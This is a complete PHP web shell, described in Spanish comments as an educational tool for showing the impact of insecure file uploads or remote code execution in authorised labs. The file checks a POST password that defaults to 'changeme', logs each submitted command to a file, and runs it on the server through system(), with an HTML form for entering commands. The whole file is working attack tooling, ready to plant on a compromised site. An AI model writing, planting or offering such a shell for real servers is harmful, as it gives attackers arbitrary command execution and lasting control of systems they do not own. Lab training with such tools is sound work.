<?php
/*
------------------------------------------------------------
 Script: php_webshell.php
 Autor: Raul Renales
 Formación y cursos: https://raulrenales.es

 Descripción:
   Webshell PHP educativa para demostrar el impacto de
   una subida de archivos insegura o RCE en aplicaciones web.

 Uso:
   Exclusivamente educativo y en entornos autorizados.
------------------------------------------------------------
*/

error_reporting(0);

/* =========================
   CONFIGURACIÓN
   ========================= */
$PASSWORD = "changeme";   // Cambiar SIEMPRE en laboratorio
$LOG_FILE = "cmd.log";    // Archivo de log de comandos

/* =========================
   AUTENTICACIÓN
   ========================= */
if (!isset($_POST['password']) || $_POST['password'] !== $PASSWORD) {
    http_response_code(403);
    echo "Access denied";
    exit;
}

/* =========================
   EJECUCIÓN DE COMANDOS
   ========================= */
if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];

    // Log simple (docente / DFIR)
    file_put_contents(
        $LOG_FILE,
        date("[Y-m-d H:i:s] ") . $cmd . PHP_EOL,
        FILE_APPEND
    );

    echo "<pre>";
    system($cmd);
    echo "</pre>";
    exit;
}
?>

<!DOCTYPE html>
<html>
<head>
    <title>PHP WebShell</title>
</head>
<body>
    <h3>PHP WebShell (Lab)</h3>
    <form method="post">
        <input type="password" name="password" placeholder="Password" required><br><br>
        <input type="text" name="cmd" placeholder="Command" size="60" autofocus>
        <br><br>
        <input type="submit" value="Execute">
    </form>
</body>
</html>
